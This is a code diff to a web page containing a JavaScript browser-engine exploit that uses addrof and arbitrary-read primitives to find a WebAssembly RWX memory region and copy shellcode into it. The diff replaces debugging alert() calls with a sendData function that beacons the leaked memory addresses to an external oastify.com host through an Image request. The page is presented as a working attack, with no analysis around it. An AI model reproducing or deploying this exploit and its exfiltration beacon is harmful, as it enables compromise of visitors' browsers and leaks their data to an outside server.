@@ -6,6 +6,11 @@
     exp
 </body>
 <script>
+	  function sendData(value, type) {
+        // Send results to external server using Image beacon
+        new Image().src = 'https://gdxw75yev1hy9vdg4m2kfp1fz65xtvhk.oastify.com/?' + 
+                         type + '=' + encodeURIComponent(value);
+    }
     var bs = new ArrayBuffer(8);
     var fs = new Float64Array(bs);
     var is = new BigUint64Array(bs);
@@ -120,13 +125,13 @@
     }
     let wasmAddr = addrof(wasmInstance);
     var shared = (read(addrof(f)+0xcn) - 1n) & 0xffffffffn;
-    alert(shared.toString(16));
+    sendData(shared.toString(16), 'shared');
     var func_data = ((read(shared + 0x4n)-1n) & 0xffffffffn);
-    alert(func_data.toString(16));
+    sendData(func_data.toString(16), 'func_data');
     var ins_obj = (read(func_data + 0x8n) - 1n) & 0xffffffffn;
-    alert("0x" + ins_obj.toString(16));
+    sendData("0x" + ins_obj.toString(16), 'ins_obj');
     var rwx_addr = read(ins_obj+60n)&0xffffffffn;
-    alert("0x" + rwx_addr.toString(16));
+    sendData("0x" + rwx_addr.toString(16), 'rwx_addr');
     var shellcode = [254, 255, 255, 234];
     copy_shellcode(shellcode);
     f();
